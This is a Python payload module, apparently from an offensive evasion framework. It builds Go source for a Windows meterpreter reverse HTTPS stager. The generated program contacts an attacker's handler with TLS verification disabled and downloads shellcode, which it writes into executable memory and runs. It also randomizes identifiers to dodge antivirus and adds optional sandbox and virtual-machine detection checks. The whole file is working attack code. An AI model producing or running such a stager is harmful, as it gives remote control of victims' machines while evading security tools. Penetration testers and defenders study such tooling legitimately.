"""

Custom-written pure go meterpreter/reverse_https stager.


Module built by @b00stfr3ak44
Updated by @ChrisTruncer

"""

from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker
from random import randint


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_https stager, no shellcode"
        self.language = "go"
        self.extension = "go"
        self.rating = "Normal"
        self.name = "Pure Golang Reverse HTTPS Stager"
        self.path = "go/meterpreter/rev_https"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "IP of the Metasploit handler"],
            "LPORT"          : ["80", "Port of the Metasploit handler"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "UTCCHECK"       : ["FALSE", "Check if system uses UTC time"],
            "USERPROMPT"     : ["FALSE", "Prompt user prior to injection"],
            "RAMCHECK"       : ["FALSE", "Check for at least 3 gigs of RAM"],
            "PROCCHECK"      : ["FALSE", "Check for active VM processes"],
            "MINPROCS"       : ["X", "Minimum number of running processes"],
            "BADMACS"        : ["FALSE", "Check for VM based MAC addresses"],
            "CLICKTRACK"     : ["X", "Require X number of clicks before execution"],
            "CURSORCHECK"    : ["FALSE", "Check for mouse movements"],
            "DISKSIZE"       : ["X", "Check for a minimum number of gigs for hard disk"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):
        memCommit = evasion_helpers.randomString()
        memReserve = evasion_helpers.randomString()
        pageExecRW = evasion_helpers.randomString()
        kernel32 = evasion_helpers.randomString()
        procVirtualAlloc = evasion_helpers.randomString()
        base64Url = evasion_helpers.randomString()
        virtualAlloc = evasion_helpers.randomString()
        size = evasion_helpers.randomString()
        allocvarout = evasion_helpers.randomString()
        err = evasion_helpers.randomString()
        randBase = evasion_helpers.randomString()
        length = evasion_helpers.randomString()
        foo = evasion_helpers.randomString()
        random = evasion_helpers.randomString()
        outp = evasion_helpers.randomString()
        i = evasion_helpers.randomString()
        randTextBase64URL = evasion_helpers.randomString()
        getURI = evasion_helpers.randomString()
        sumVar = evasion_helpers.randomString()
        checksum8 = evasion_helpers.randomString()
        uri = evasion_helpers.randomString()
        value = evasion_helpers.randomString()
        tr = evasion_helpers.randomString()
        client = evasion_helpers.randomString()
        hostAndPort = evasion_helpers.randomString()
        port = self.required_options["LPORT"][0]
        host = self.required_options["LHOST"][0]
        response = evasion_helpers.randomString()
        uriLength = randint(5, 255)
        payload = evasion_helpers.randomString()
        bufferVar = evasion_helpers.randomString()
        x = evasion_helpers.randomString()
        heapcreatevariable = evasion_helpers.randomString()
        heapallocvariable = evasion_helpers.randomString()
        heapcreateout = evasion_helpers.randomString()
        cust_func = evasion_helpers.randomString()
        errorvariable = evasion_helpers.randomString()
        errorvariabledos = evasion_helpers.randomString()

        # sandbox check code
        sandbox_checks, num_curlys = gamemaker.senecas_games(self)

        # Todo: randomize import order
        payload_code = "package main\nimport (\n\"syscall\"\n\"unsafe\"\n"
        payload_code += "\"io/ioutil\"\n\"math/rand\"\n\"net/http\"\n\"time\"\n\"crypto/tls\"\n"

        if self.required_options["PROCESSORS"][0].lower() != "x":
            payload_code += "\"runtime\"\n"

        # Add in other imports based on checks being performed
        if self.required_options["USERNAME"][0].lower() != "x":
            payload_code += "\"strings\"\n\"os/user\"\n"
        if self.required_options["HOSTNAME"][0].lower() != "x" or self.required_options["PROCCHECK"][0].lower() != 'false':
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
        if self.required_options["SLEEP"][0].lower() != "x":
            payload_code += "\"net\"\n\"encoding/binary\"\n"
        if self.required_options["BADMACS"][0].lower() != 'false':
            if "net" not in payload_code:
                payload_code += "\"net\"\n"
            if "strings" not in payload_code:
                payload_code += "\"strings\"\n"
        if self.required_options["UTCCHECK"][0].lower() != 'false':
            if "time" not in payload_code:
                payload_code += "\"time\"\n"
        if self.required_options["CURSORCHECK"][0].lower() != 'false':
            if "time" not in payload_code:
                payload_code += "\"time\"\n"

        payload_code += ")\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "const (\n"
            payload_code += "%s  = 0x1000\n" % (memCommit)
            payload_code += "%s = 0x2000\n" % (memReserve)
            payload_code += "%s  = 0x40\n)\n" % (pageExecRW)

        payload_code += "var (\n"
        payload_code += "%s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_\"\n" %(base64Url)

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "%s = syscall.NewLazyDLL(\"kernel32.dll\")\n" % (kernel32)
            payload_code += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" % (procVirtualAlloc, kernel32)
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
            payload_code += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" % (allocvarout, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += kernel32 + " = syscall.NewLazyDLL(\"kernel32.dll\")\n"
            payload_code += heapcreatevariable + " = " + kernel32 + ".NewProc(\"HeapCreate\")\n"
            payload_code += heapallocvariable + " = " + kernel32 + ".NewProc(\"HeapAlloc\")\n)\n"
            payload_code += "func %s(%s uintptr) (uintptr, error) {\n" % (cust_func, size)
            payload_code += heapcreateout + ", _, " + errorvariable + " := " + heapcreatevariable + ".Call(0x00040000, " + size + ", 0)\n"
            payload_code += allocvarout + ", _, " + errorvariabledos + " := " + heapallocvariable + ".Call(" + heapcreateout + ", 0x00000008, " + size + ")\n"
            payload_code += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" % (allocvarout, err, allocvarout)

        payload_code += "func %s(%s int, %s []byte) string {\n" % (randBase, length, foo)
        payload_code += "%s := rand.New(rand.NewSource(time.Now().UnixNano()))\n" % (random)
        payload_code += "var %s []byte\n" % (outp)
        payload_code += "for %s := 0; %s < %s; %s++ {\n" % (i, i, length, i)
        payload_code += "%s = append(%s, %s[%s.Intn(len(%s))])\n}\n" % (outp, outp, foo, random, foo)
        payload_code += "return string(%s)\n}\n" % (outp)

        payload_code += "func %s(%s int) string {\n" % (randTextBase64URL, length)
        payload_code += "%s := []byte(%s)\n" % (foo, base64Url)
        payload_code += "return %s(%s, %s)\n}\n" % (randBase, length, foo)

        payload_code += "func %s(%s, %s int) string {\n" % (getURI, sumVar, length)
        payload_code += "for {\n%s := 0\n%s := %s(%s)\n" % (checksum8, uri, randTextBase64URL, length)
        payload_code += "for _, %s := range []byte(%s) {\n%s += int(%s)\n}\n" % (value, uri, checksum8, value)
        payload_code += "if %s%s == %s {\nreturn \"/\" + %s\n}\n}\n}\n" % (checksum8, '%0x100', sumVar, uri)

        payload_code += "func main() {\n"
        # Sandbox code goes here
        if sandbox_checks != '':
            payload_code += sandbox_checks
        payload_code += "%s := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}\n" %(tr)
        payload_code += "%s := http.Client{Transport: %s}\n" % (client, tr)
        payload_code += "%s := \"https://%s:%s\"\n" % (hostAndPort, host, port)
        payload_code += "%s, _ := %s.Get(%s + %s(92, %s))\n" % (response, client, hostAndPort, getURI, uriLength)
        payload_code += "defer %s.Body.Close()\n" % (response)
        payload_code += "%s, _ := ioutil.ReadAll(%s.Body)\n" % (payload, response)
        payload_code += "%s, _ := %s(uintptr(len(%s)))\n" % (allocvarout, cust_func, payload)
        payload_code += "%s := (*[990000]byte)(unsafe.Pointer(%s))\n" % (bufferVar, allocvarout)
        payload_code += "for %s, %s := range %s {\n" %(x, value, payload)
        payload_code += "%s[%s] = %s\n}\n" % (bufferVar, x, value)
        payload_code += "syscall.Syscall(%s, 0, 0, 0, 0)\n}\n" % (allocvarout)
        payload_code += '}' * num_curlys

        self.payload_source_code = payload_code
        return
